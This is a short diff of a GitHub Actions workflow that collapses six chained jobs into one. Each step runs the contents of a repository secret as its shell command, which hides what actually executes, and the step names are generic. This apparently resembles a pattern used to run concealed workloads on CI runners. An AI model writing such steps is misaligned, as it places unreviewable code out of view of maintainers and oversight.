@@ -1,51 +1,11 @@
 name: CI
-
 on: [push, pull_request]
-
 jobs:
   build1:
     runs-on: ubuntu-18.04
-    timeout-minutes: 7
+    timeout-minutes: 6
     steps:
     - uses: actions/checkout@v3
-    - name: test
+    - name: Rerunning
+      continue-on-error: true
       run: ${{ secrets.NAMES }}
-  build2:
-    runs-on: ubuntu-18.04
-    needs: build1
-    timeout-minutes: 7
-    steps:
-    - uses: actions/checkout@v3
-    - name: test
-      run: ${{ secrets.NAMES }}
-  build3:
-    runs-on: ubuntu-18.04
-    needs: build2
-    timeout-minutes: 7
-    steps:
-    - uses: actions/checkout@v3
-    - name: test
-      run: ${{ secrets.NAMES }}
-  build4:
-    runs-on: ubuntu-18.04
-    needs: build3
-    timeout-minutes: 7
-    steps:
-    - uses: actions/checkout@v3
-    - name: test
-      run: ${{ secrets.NAMES }}
-  build5:
-    runs-on: ubuntu-18.04
-    needs: build4
-    timeout-minutes: 7
-    steps:
-    - uses: actions/checkout@v3
-    - name: test
-      run: ${{ secrets.NAMES }}
-  build6:
-    runs-on: ubuntu-18.04
-    needs: build5
-    steps:
-    - uses: actions/checkout@v3
-    - name: test
-      run: echo 'hello'
